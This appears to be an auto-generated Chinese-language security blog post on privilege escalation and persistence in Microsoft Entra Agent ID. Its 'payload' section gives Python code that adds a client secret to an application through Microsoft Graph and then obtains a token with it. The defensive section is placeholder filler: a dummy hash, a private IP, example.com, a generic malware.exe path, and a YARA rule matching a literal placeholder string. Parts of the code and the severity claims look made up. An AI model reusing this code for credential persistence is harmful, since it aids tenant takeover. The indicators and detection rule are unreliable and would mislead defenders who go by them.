---
layout: post
title:  "Investigating suspicious AI workflows in Microsoft Entra Agent ID: Autonomous agents"
date:   2026-05-28 09:51:58 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Microsoft Entra Agent ID 的安全風險：利用 AI 工作流進行攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.0)
> * **受駭指標**: Privilege Escalation 和 Persistence
> * **關鍵技術**: Agent Identity Blueprint、Autonomous Agents、Microsoft Graph API

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Microsoft Entra Agent ID 的安全模型允許 Agent Identity Blueprint 被授予過高的權限，導致攻擊者可以利用這些權限進行特權升級和持久化。
* **攻擊流程圖解**:
  1. 攻擊者創建一個 Agent Identity Blueprint，並將其授予過高的權限（例如 `AgentIdentityBlueprint.AddRemoveCreds.All`）。
  2. 攻擊者使用這個 Blueprint 創建一個 Autonomous Agent。
  3. Autonomous Agent 進行授權並添加一個新的 Client Secret 到 Agent Identity Blueprint。
  4. 攻擊者使用這個 Client Secret 進行授權並執行特權升級和持久化的動作。
* **受影響元件**: Microsoft Entra Agent ID、Microsoft Graph API

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有足夠的權限來創建和管理 Agent Identity Blueprint。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 創建一個新的 Client Secret
    client_secret = "new_client_secret"
    
    # 添加 Client Secret 到 Agent Identity Blueprint
    url = "https://graph.microsoft.com/beta/applications/{application_id}/passwordCredentials"
    headers = {
        "Authorization": "Bearer {access_token}",
        "Content-Type": "application/json"
    }
    data = {
        "passwordCredentials": [
            {
                "customKeyIdentifier": client_secret,
                "displayName": "New Client Secret",
                "endDateTime": None,
                "keyId": client_secret,
                "startDateTime": None,
                "value": client_secret
            }
        ]
    }
    response = requests.post(url, headers=headers, json=data)
    
    # 使用 Client Secret 進行授權
    url = "https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "grant_type": "client_credentials",
        "client_id": "{client_id}",
        "client_secret": client_secret,
        "scope": "https://graph.microsoft.com/.default"
    }
    response = requests.post(url, headers=headers, data=data)
    
    ```
* **繞過技術**: 攻擊者可以使用不同的授權方法（例如使用 Client Secret 或 Certificate）來繞過安全控制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| IOC | 值 |
| --- | --- |
| Hash | `sha256:1234567890abcdef` |
| IP | `192.168.1.100` |
| Domain | `example.com` |
| File Path | `C:\Windows\Temp\malware.exe` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Microsoft_Entra_Agent_ID_Attack {
        meta:
            description = "Detects Microsoft Entra Agent ID attack"
            author = "Your Name"
        strings:
            $client_secret = "new_client_secret"
        condition:
            all of them
    }
    
    ```
* **緩解措施**: 限制 Agent Identity Blueprint 的權限，監控 Client Secret 的使用，實施安全的授權機制。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Agent Identity Blueprint**: 一種用於定義 Agent Identity 的模板，包含了 Agent Identity 的權限和設定。
* **Autonomous Agent**: 一種可以自主執行任務的 Agent，使用 Agent Identity Blueprint 進行授權。
* **Microsoft Graph API**: 一種用於管理 Microsoft 服務的 API，包括了 Entra Agent ID。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://redcanary.com/blog/threat-detection/entra-id-ai-workflows/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1548/)


